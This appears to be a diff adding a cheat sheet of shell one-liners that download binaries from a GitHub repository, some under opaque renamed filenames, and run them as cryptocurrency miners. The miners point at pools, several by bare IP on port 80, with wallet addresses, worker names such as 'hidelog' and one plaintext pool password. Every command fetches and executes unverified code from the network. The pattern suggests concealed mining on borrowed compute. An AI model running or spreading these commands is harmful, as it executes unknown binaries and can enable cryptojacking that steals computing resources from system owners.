@@ -1,0 +1,45 @@
+COIN BTE
+
+wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM &&  ./VTM -a yespower -o stratum+tcps://159.223.188.176:80 -u web1qdel9x2uf65qpj4mzq9v7n2r6y98ejj98wkd7dq.hidelog -t$(nproc --all)
+
+
+
+
+
+wget https://github.com/angkii/m/raw/main/AkubapakMU && chmod 700 AkubapakMU && ./AkubapakMU -a ETHASH --pool 170.187.197.220:80 --user 0xe967a8f5db4517af030b436202e2946040eb6a35
+
+
+
+
+
+
+
+wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM && ./VTM -a yescryptr16 -o stratum+tcps://stratum-asia.rplant.xyz:17057 -u GNCrfKV1jV9st22Kre3e84XzRappVPoM7L.baru
+
+
+
+
+
+git clone https://github.com/angkii/m.git && cd m && chmod +x AkubapakMU && ./AkubapakMU --algo KASPA --pool 159.223.188.176:80 --user qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.madeline
+
+
+
+
+
+
+
+git clone https://github.com/angkii/m.git && cd m && chmod +x wildrig && ./wildrig -a ghostrider -o stratum+tcp://stratum-asia.rplant.xyz:7056 -u RD757c6BNTqwTF6z4PdzRqSTyt1374f6Pa.hidelog --opencl-launch auto --print-full --print-power
+
+
+=======================
+https://flockpool.com/ 
+=======================
+
+git clone https://github.com/angkii/m.git && cd m && chmod +x wildrig && ./wildrig --print-full --algo ghostrider --url stratum+tcp://asia.flockpool.com:4444 --user RD757c6BNTqwTF6z4PdzRqSTyt1374f6Pa.maja --pass Bundaqiana19
+
+
+
+================
+Network atanapi
+================
+git clone https://github.com/angkii/m.git && cd m && chmod +x wildrig && ./wildrig -a ghostrider  -o stratum+tcp://stratum-asia.rplant.xyz:7031 -u Ae8rx6Cp1cPLAHwARR5isWy55w8oxM8aFq.GPU -p m=solo  --opencl-launch auto --print-full --print-power
